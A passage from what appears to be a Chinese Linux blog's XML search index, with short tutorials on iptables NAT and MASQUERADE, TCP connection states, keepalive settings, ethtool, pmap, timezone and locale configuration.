&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;典型的应用是，有个web服务器放在内网配置内网ip，前端有个防火墙配置公网ip，互联网上的访问者使用公网ip来访问这个网站当访问的时候，客户端发出一个数据包，这个数据包的报头里边，目标地址写的是防火墙的公网ip，防火墙会把这个数据包的报头改写一次，将目标地址改写成web服务器的内网ip，然后再把这个数据包发送到内网的web服务器上，这样，数据包就穿透了防火墙，并从公网ip变成了一个对内网地址的访问了，即DNAT，基于目标的网络地址转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MASQUERADE，地址伪装，在iptables中有着和SNAT相近的效果，但也有一些区别，但使用SNAT的时候，出口ip的地址范围可以是一个，也可以是多个，例如： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下命令表示把所有10.8.0.0网段的数据包SNAT成192.168.5.3的ip然后发出去 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j SNAT --to-source 192.168.5.3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如下命令表示把所有10.8.0.0网段的数据包SNAT成192.168.5.3/192.168.5.4/192.168.5.5等几个ip然后发出去 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j SNAT --to-source 192.168.5.3-192.168.5.5 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这就是SNAT的使用方法，即可以NAT成一个地址，也可以NAT成多个地址，但是，对于SNAT，不管是几个地址，必须明确的指定要SNAT的ip。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如当前系统用的是ADSL动态拨号方式，那么每次拨号，出口ip192.168.5.3都会改变，而且改变的幅度很大，不一定是192.168.5.3到192.168.5.5范围内的地址，这个时候如果按照现在的方式来配置iptables就会出现问题了，因为每次拨号后，服务器地址都会变化，而iptables规则内的ip是不会随着自动变化的，每次地址变化后都必须手工修改一次iptables，把规则里边的固定ip改成新的ip，这样是非常不好用的。MASQUERADE就是针对这种场景而设计的，他的作用是，从服务器的网卡上，自动获取当前ip地址来做NAT。比如下边的命令： 1iptables -t nat -A POSTROUTING -s 10.8.0.0/255.255.255.0 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如此配置的话，不用指定SNAT的目标ip了，不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用netstat查看网络状态详解]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F57.%20%E7%94%A8netstat%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[用netstat查看网络状态详解 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常情况下:一个正常的TCP连接，都会有三个阶段: TCP三次握手; 数据传送; TCP四次挥手 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注:以下说明最好能结合”图:TCP的状态机”来理解。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYN: (同步序列编号,Synchronize Sequence Numbers)该标志仅在三次握手建立TCP连接时有效。表示一个新的TCP连接请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ACK: (确认编号,Acknowledgement Number)是对TCP请求的确认标志,同时提示对端系统已经成功接收所有数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FIN: (结束标志,FINish)用来结束一个TCP回话.但对应端口仍处于开放状态,准备接收后续数据。 LISTEN:首先服务端需要打开一个socket进行监听，状态为LISTEN. / The socket is listening for incoming connections. 侦听来自远方TCP端口的连接请求 / SYN_SENT:客户端通过应用程序调用connect进行active open.于是客户端tcp发送一个SYN以请求建立一个连接.之后状态置为SYN_SENT. /*The socket is actively attempting to establish a connection. 在发送连接请求后等待匹配的连接请求 */ SYN_RECV:服务端应发出ACK确认客户端的SYN,同时自己向客户端发送一个SYN. 之后状态置为SYN_RECV /* A connection request has been received from the network. 在收到和发送一个连接请求后等待对连接请求的确认 */ ESTABLISHED: 代表一个打开的连接，双方可以进行或已经在数据交互了。/* The socket has an established connection. 代表一个打开的连接，数据可以传送给用户 */ FIN_WAIT1:主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态./* The socket is closed, and the connection is shutting down. 等待远程TCP的连接中断请求，或先前的连接中断请求的确认 */ CLOSE_WAIT:被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求(它的接收也作为文件结束符传递给上层应用程序),并进入CLOSE_WAIT. /* The remote end has shut down, waiting for the socket to close. 等待从本地用户发来的连接中断请求 */ FIN_WAIT2:主动关闭端接到ACK后，就进入了FIN-WAIT-2 ./* Connection is closed, and the socket is waiting for a shutdown from the remote end. 从远程TCP等待连接中断请求 */ LAST_ACK:被动关闭端一段时间后，接收到文件结束符的应用程序将调用CLOSE关闭连接。这导致它的TCP也发送一个 FIN,等待对方的ACK.就进入了LAST-ACK . /* The remote end has shut down, and the socket is closed. Waiting for acknowledgement. 等待原来发向远程TCP的连接中断请求的确认 */ TIME_WAIT:在主动关闭端接收到FIN后，TCP就发送ACK包，并进入TIME-WAIT状态。/* The socket is waiting after close to handle packets still in the network.等待足够的时间以确保远程TCP接收到连接中断请求的确认 */ CLOSING: 比较少见./* Both sockets are shut down but we still don’t have all our data sent. 等待远程TCP对连接中断的确认 */ CLOSED: 被动关闭端在接受到ACK包后，就进入了closed的状态。连接结束./* The socket is not being used. 没有任何连接状态 */ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TIME_WAIT状态的形成只发生在主动关闭连接的一方。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主动关闭方在接收到被动关闭方的FIN请求后，发送成功给对方一个ACK后,将自己的状态由FIN_WAIT2修改为TIME_WAIT，而必须再等2倍 的MSL(Maximum Segment Lifetime,MSL是一个数据报在internetwork中能存在的时间)时间之后双方才能把状态 都改为CLOSED以关闭连接。目前RHEL里保持TIME_WAIT状态的时间为60秒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然上述很多TCP状态在系统里都有对应的解释或设置,可见man tcp 关于长连接和短连接:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通俗点讲:短连接就是一次TCP请求得到结果后,连接马上结束.而长连接并不马上断开,而一直保持着,直到长连接TIMEOUT(具体程序都有相关参数说明).长连接可以避免不断的进行TCP三次握手和四次挥手. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;长连接(keepalive)是需要靠双方不断的发送探测包来维持的,keepalive期间服务端和客户端的TCP连接状态是ESTABLISHED.目前http 1.1版本里默认都是keepalive(1.0版本默认是不keepalive的)，ie6/7/8和firefox都默认用的是http 1.1版本了(如何查看当前浏览器用的是哪个版本，这里不再赘述)。Apache,java &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个应用至于到底是该使用短连接还是长连接，应该视具体情况而定。一般的应用应该使用长连接。 Linux的相关keepalive参数1234567891011a、 tcp_keepalive_time - INTEGERHow often TCP sends out keepalive messages when keepalive is enabled.Default: 2hours.b、 tcp_keepalive_probes - INTEGERHow many keepalive probes TCP sends out, until it decides that theconnection is broken. Default value: 9.c、 tcp_keepalive_intvl - INTEGERHow frequently the probes are send out. Multiplied bytcp_keepalive_probes it is time to kill not responding connection,after probes started. Default value: 75sec i.e. connectionwill be aborted after ~11 minutes of retries. F5负载均衡上的相关参数说明123456a、Keep Alive IntervalSpecifies, when enabled, how frequently the system sends data over an idle TCP connection, to determine whether the connection is still valid.Specify: Specifies the interval at which the system sends data over an idle connection, to determine whether the connection is still valid. The default is 1800 milliseconds.b、Time WaitSpecifies the length of time that a TCP connection remains in the TIME-WAIT state before entering the CLOSED state.Specify: Specifies the number of milliseconds that a TCP connection can remain in the TIME-WAIT state. The default is 2000. 123c、Idle TimeoutSpecifies the length of time that a connection is idle (has no traffic) before the connection is eligible for deletion.Specify: Specifies a number of seconds that the TCP connection can remain idle before the system deletes it. The default is 300 seconds. Apache的相关参数说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是Apache/2.0.61版本的默认参数和说明 12345678910a、KeepAlive:default On.Whether or not to allow persistent connections (more thanone request per connection). Set to “Off” to deactivate.b、MaxKeepAliveRequests:default 100.The maximum number of requests to allowduring a persistent connection. Set to 0 to allow an unlimited amount.We recommend you leave this number high, for maximum performance.c、KeepAliveTimeout:default 15. Number of seconds to wait for the next request from thesame client on the same connection.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables中的DNAT、SNAT、和MASQUERADE]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F59.%20iptables%E4%B8%AD%E7%9A%84DNAT%E3%80%81SNAT%E5%92%8CMASQUERADE%2F</url>
    <content type="text"><![CDATA[iptables中DNAT、SNAT和MASQUERADE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映谢。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映谢。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是在设置Linux网关或者防火墙时经常要用来的两种方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，要了解一下IP包的结构，如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，再看看数据包在iptables中要经过的链（chain）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这也就是说，要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如要把访问202.103.96.112的访问转发到192.168.0.112上： 1iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT --to-destination 192.168.0.112 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个转换过程当中，其实就是将已经达到这台Linux网关（防火墙）上的数据包上的destination ip address从202.103.96.112修改为192.168.0.112然后交给系统路由进行转发。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作 1iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT --to-source 58.20.51.66 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个语句就是告诉系统把即将要流出本机的数据的source ip address修改成为58.20.51.66。这样，数据包在达到目的机器以后，目的机器会将包返回到58.20.51.66也就是本机。如果不做这个操作，那么你的数据包在传递的过程中，reply的包肯定会丢失。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如当前系统用的是ADSL/3G/4G动态拨号方式，那么每次拨号，出口IP都会改变，SNAT就会有局限性。 1iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重点在那个『 MASQUERADE 』！这个设定值就是『IP伪装成为封包出去(-o)的那块装置上的IP』！不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何删除脚本中的汉字]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F58.%20%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%B1%89%E5%AD%97%2F</url>
    <content type="text"><![CDATA[如何删除脚本中的汉字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天遇到个问题，脚本中参杂了中文汉字，现在需要删除所有汉字。以前在脚本中删除一两个汉字，那时手到擒来，匹配所有汉字还是第一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;汉字在计算机系统里是按照一定的编码格式表示的，就是常说的 GB2312、GB18030等，只要符合这个编码格式的就都是汉字了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从GB2312-1980编码开始，汉字都是采用双字节编码。为 了与系统中基本的ASCII字符集区分开，所有汉字编码的每个字节的第一位都是1。GB2312的汉字编码规则为：第一个字节的值在0xb0到0xF7之间，第二个字节的值在0xAO到0xFE直接。由于GB13000是对GB2312的扩展，所以也被称为GBK。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么用sed把符合这些编码格式的用空替代就解决问题了。 sed的命令表达式： 1sed -r "s/[\x81-\xFE][\x40-\xFE]//g" file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行以后发现有问题，原来系统的编码设置问题，更新一下： 1LANG=C sed -r "s/[\x81-\xFE][\x40-\xFE]//g" file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;C代表英文环境ASCII编码格式，再次运行，一切OK。]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下调整时区和时间的方法]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F49.%20Linux%E4%B8%8B%E8%B0%83%E6%95%B4%E6%97%B6%E5%8C%BA%E5%92%8C%E6%97%B6%E9%97%B4%E7%9A%84%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Linux下调整时区和时间的方法 找到相应的时区文件 /usr/share/zoneinfo/Asia/Shanghai，用这个文件替换前的 /etc/localtime 文件。 1cp /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 修改 /etc/sysconfig/clock 文件，修改为 123ZONE="Asia/Shanghai"UTC=falseARC=false 时间设定成2017年7月10日的命令 1date -s 10/07/2017 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;将系统时间设定成下午6点40分0秒的命令 1date -s 18:40:00 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其实可以两个写一起 1date -s "2017-07-10 18:40:00" 同步BIOS时钟，强制把系统时间写入CMOS，命令 1clock -w 如果有时间服务器，可以用这个命令同步时间 1ntpdate time.windows.com]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下的几个网络连接状态具体含义]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F56.%20Linux%E4%B8%8B%E7%9A%84%E5%87%A0%E4%B8%AA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%85%B7%E4%BD%93%E5%90%AB%E4%B9%89%2F</url>
    <content type="text"><![CDATA[Linux下的几个网络连接状态具体含义 LISTEN：首先服务端需要打开一个socket进行监听，状态为LISTEN。 / The socket is listening for incoming connections. 侦听来自远方TCP端口的连接请求 / SYN_SENT：客户端通过应用程序调用connect进行active open，于是客户端TCP发送一个SYN以请求建立一个连接，之后状态置为SYN_SENT。 /The socket is actively attempting to establish a connection. 在发送连接请求后等待匹配的连接请求 / SYN_RECV：服务端应发出ACK确认客户端的SYN，同时自己向客户端发送一个SYN，之后状态置为SYN_RECV。 / A connection request has been received from the network. 在收到和发送一个连接请求后等待对连接请求的确认 / ESTABLISHED：代表一个打开的连接，双方可以进行或已经在数据交互了。 / The socket has an established connection. 代表一个打开的连接，数据可以传送给用户 / FIN_WAIT1：主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态。 / The socket is closed, and the connection is shutting down. 等待远程TCP的连接中断请求，或先前的连接中断请求的确认 / CLOSE_WAIT：被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求（它的接收也作为文件结束符传递给上层应用程序），并进入CLOSE_WAIT。 / The remote end has shut down, waiting for the socket to close. 等待从本地用户发来的连接中断请求 / FIN_WAIT2：主动关闭端接到ACK后，就进入了FIN-WAIT-2。 / Connection is closed, and the socket is waiting for a shutdown from the remote end. 从远程TCP等待连接中断请求 / LAST_ACK：被动关闭端一段时间后，接收到文件结束符的应用程序将调用CLOSE关闭连接。这导致它的TCP也发送一个FIN，等待对方的ACK，就进入了LAST-ACK。 / The remote end has shut down, and the socket is closed. Waiting for acknowledgement. 等待原来发向远程TCP的连接中断请求的确认 / TIME_WAIT：在主动关闭端接收到FIN后，TCP就发送ACK包，并进入TIME-WAIT状态。 / The socket is waiting after close to handle packets still in the network.等待足够的时间以确保远程TCP接收到连接中断请求的确认 / CLOSING：比较少见。 / Both sockets are shut down but we still don’t have all our data sent. 等待远程TCP对连接中断的确认 / CLOSED：被动关闭端在接受到ACK包后，就进入了CLOSED的状态，连接结束。 / The socket is not being used. 没有任何连接状态 /]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux查看网卡速度调整工作模式]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F55.%20Linux%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1%E9%80%9F%E5%BA%A6%E8%B0%83%E6%95%B4%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Linux查看网卡速度调整工作模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看网卡速度有两个命令都可以查看： 12mii-tooleth0: negotiated 1000baseT-FD flow-control, link ok &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这表示，eth0网卡的速度为1000M，并且是全双工工作模式，也可以使用 123456789101112131415161718192021ethtool eth0Settings for eth0: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Supports auto-negotiation: Yes Advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Advertised auto-negotiation: Yes Speed: 1000Mb/s Duplex: Full Port: Twisted Pair PHYAD: 0 Transceiver: internal Auto-negotiation: on Supports Wake-on: umbg Wake-on: g Current message level: 0x00000007 (7) Link detected: yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Speed 后边的数值就是速度，Duplex后边就是工作不是，full表示全双工，如果是half则表示半双工模式；Auto-negotiation 后边表示是否自动协商 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么如何调整网卡的速度以及工作模式？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改linux网卡的工作模式： ethtool –r ethX 重置ethX网口到自适应模式 ethtool –S ethX 查询ethX网口收发包统计 ethtool –s ethX [speed 10|100|1000] 设置网口速率10/100/1000M [duplex half|full] 设置网口半/全双工 [autoneg on|off] 设置网口是否自协商 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的命令会把eth0设置成全双工非自动协商工作模式，并且速度为100M 1ethtool -s eth0 duplex full autoneg off speed 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置网卡工作模式开机为全双工的方法： 在/etc/sysconfig/network-script/ifcfg-ethX加入下面这句： 1ETHTOOL_OPTS="speed 100 duplex full autoneg off" 2.将上面的命令写入到/etc/rc.local里面。 1ethtool -s eth0 duplex full autoneg off speed 100]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[怎么知道Linux系统安装的时间]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F51.%20%E6%80%8E%E4%B9%88%E7%9F%A5%E9%81%93Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85%E7%9A%84%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[怎么知道Linux系统安装的时间&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在安装系统时，每个分区都会有一个lost+found，而且这个目录的创建时间是和该分区创建的时间一样的。所以如果想知道系统是什么时候安装的，只需要看这个目录的创建时间即可。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常情况下，分区都会把/boot单独分一个区，所以只要查看/boot/lost+found这个目录的创建时间即可。比较简单的方法是： 1ls -ld /boot/lost+found &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果/boot/不是单独分区，那么就看一下 / 下的吧。 1ls -ld /lost+found]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下使用pmap指令查看进程的内存使用]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F54.%20Linux%E4%B8%8B%E4%BD%BF%E7%94%A8pmap%E6%8C%87%E4%BB%A4%E6%9F%A5%E7%9C%8B%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%86%85%E5%AD%98%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Linux下使用pmap指令查看进程的内存使用&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pmap这个指令是用来查看进程占用的内存及使用地址空间。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;常使用的选项为 -d ，如下查看进程 （pid为24030）的内存使用： 1234567891011121314151617pmap -d 2403024030: /usr/local/php/bin/php-cgi --fpm --fpm-config /usr/local/php/etc/php-fpm.confAddress Kbytes Mode Offset Device Mapping0000000000400000 6444 r-x-- 0000000000000000 008:00002 php-cgi0000000000c4b000 272 rw--- 000000000064b000 008:00002 php-cgi0000000000c8f000 52 rw--- 0000000000c8f000 000:00000 [ anon ]00000000059dc000 9572 rw--- 00000000059dc000 000:00000 [ anon ]0000003519000000 508 r-x-- 0000000000000000 008:00002 libfreetype.so.6.3.10000000351907f000 2048 ----- 000000000007f000 008:00002 libfreetype.so.6.3.10中间部分省略00002b757df75000 4 rw--- 000000000000a000 008:00002 libnss_files-2.5.so00002b757df76000 32768 rw-s- 0000000000000000 000:00008 zero (deleted)00002b7580685000 4 rw-s- 0000000000000000 000:00008 zero (deleted)00007fff2e126000 476 rwx-- 00007fff2e126000 000:00000 [ stack ]00007fff2e19d000 8 rw--- 00007fff2e19d000 000:00000 [ anon ]ffffffffff600000 8192 ----- 0000000000000000 000:00000 [ anon ]mapped: 139548K writeable/private: 12344K shared: 32772K &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每列的含义如下： Address: 进程所占的地址空间 Kbytes 该虚拟段的大小 Mode 权限：r=read, w=write, x=execute, s=shared, p=private(copy on write) Mapping: bash 对应的映像文件名.要看的是最后一行的值 mapped 表示该进程映射的虚拟地址空间大小，也就是该进程预先分配的虚拟内存大小，即ps出的vsz writeable/private 表示进程所占用的私有地址空间大小，也就是该进程实际使用的内存大小 shared 表示进程和其他进程共享的内存大小 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Linux 会把一些shared libraries 载入到内存中，在pmap 的输出中，这些shared libraries 的名字通常是 lib*.so ,如 libX11.so.6.2.0 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 libX11.so.6.2.0 会被很多process load 到自己的运行环境中，同时，ps 输出的RSS 结果中，每个process 都包含了这个libX11.so.6.2.0 ，而事实上它只被load 了一次，如果单纯把ps 的结果相加，这样就重复计算了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看pmap输出的结果，其实php-cgi 单纯进程所占的内存是这个writeable/private: 12344K]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PS出的RSS总和大于实际物理内存]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F53.%20PS%E5%87%BA%E7%9A%84RSS%E6%80%BB%E5%92%8C%E5%A4%A7%E4%BA%8E%E5%AE%9E%E9%99%85%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98%2F</url>
    <content type="text"><![CDATA[PS出的RSS总和大于实际物理内存&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;使用ps aux 查看系统进程时，第六列即 RSS列显示的就是进程使用的物理内存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可是把系统所有进程的该列相加时，得到的总和又远远高于系统实际的物理内存？这到底是怎么回事呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看一看linux是如何管理内存的就会知道。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;理解的意思是这样的，linux会在每个进程生成时分配一定量的内存给这个进程，这个只是分配，而体现在ps出来的是VSZ那列，这叫做虚拟内存。但实际上这些进程并没有占用这些内存。不妨，我也借用网上的一个例子来形容一下，就像银行发工资给员工一样，每个员工都有一个自己的银行卡，每月银行都会把固定的钱数打到员工的银行卡里，但是这个过程并不是把实际的钱发到员工手里，只是一串数字而已。实际上，银行并没有那么多钱的。回头再来看看linux给进程分配内存是不是和上面的举的例子很像呢？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;讲了上面的观点后，依然不能把笔者所设的问题解答，那么继续往下探讨： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;把系统所有进程的该列相加时，得到的总和又远远高于系统实际的物理内存？这是因为 ps 的结果，RSS 那部分，是包括共享内存的。这里使用 pmap 来看看。 1234567891011121314151617pmap -d 2403024030: /usr/local/php/bin/php-cgi --fpm --fpm-config /usr/local/php/etc/php-fpm.confAddress Kbytes Mode Offset Device Mapping0000000000400000 6444 r-x-- 0000000000000000 008:00002 php-cgi0000000000c4b000 272 rw--- 000000000064b000 008:00002 php-cgi0000000000c8f000 52 rw--- 0000000000c8f000 000:00000 [ anon ]00000000059dc000 9572 rw--- 00000000059dc000 000:00000 [ anon ]0000003519000000 508 r-x-- 0000000000000000 008:00002 libfreetype.so.6.3.10000000351907f000 2048 ----- 000000000007f000 008:00002 libfreetype.so.6.3.10中间部分省略00002b757df75000 4 rw--- 000000000000a000 008:00002 libnss_files-2.5.so00002b757df76000 32768 rw-s- 0000000000000000 000:00008 zero (deleted)00002b7580685000 4 rw-s- 0000000000000000 000:00008 zero (deleted)00007fff2e126000 476 rwx-- 00007fff2e126000 000:00000 [ stack ]00007fff2e19d000 8 rw--- 00007fff2e19d000 000:00000 [ anon ]ffffffffff600000 8192 ----- 0000000000000000 000:00000 [ anon ]mapped: 139548K writeable/private: 12344K shared: 32772K &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;pmap是用来显示内存使用的指令，-d 后面跟的是进程id. 关于pmap的使用以及显示的数据请看http://www.lishiming.net/thread-977-1-1.html &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux 会把一些shared libraries 载入到内存中，在pmap 的输出中，这些shared libraries 的名字通常是 lib*.so ,如 libX11.so.6.2.0 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个 libX11.so.6.2.0 会被很多process load 到自己的运行环境中，同时，ps 输出的RSS 结果中，每个process 都包含了这个libX11.so.6.2.0 ，而事实上它只被load 了一次，如果单纯把ps 的结果相加，这样就重复计算了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;看pmap输出的结果，其实php-cgi 单纯进程所占的内存是这个writeable/private: 12344K]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[修改Linux系统的默认字符集]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F50.%20%E4%BF%AE%E6%94%B9Linux%E7%B3%BB%E7%BB%9F%E7%9A%84%E9%BB%98%E8%AE%A4%E5%AD%97%E7%AC%A6%E9%9B%86%2F</url>
    <content type="text"><![CDATA[修改Linux系统的默认字符集&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统安装时选择了简体中文安装，安装完成后运行netconfig、setup等命令，中文显示乱码 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;只要修改 /etc/sysconfig/i18n，默认为 12345LANG="zh_CN.UTF-8" SUPPORTER="zh_CN.UTF-8:zh_CN:zh" SYSFONT="latarcyrheb-sun16" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 12345LANG="en_US.UTF-8" SUPPORTER="en_US.UTF-8:en_US:zh" SYSFONT="latarcyrheb-sun16" &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启系统就OK，中文乱码变成了英文显示。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下比较两个时间的时间差]]></title>
    <url>%2F2017%2F08%2F14%2F1.%20Linux%20%E5%9F%BA%E7%A1%80%2F48.Linux%E4%B8%8B%E6%AF%94%E8%BE%83%E4%B8%A4%E4%B8%AA%E6%97%B6%E9%97%B4%E7%9A%84%E6%97%B6%E9%97%B4%E5%B7%AE%2F</url>
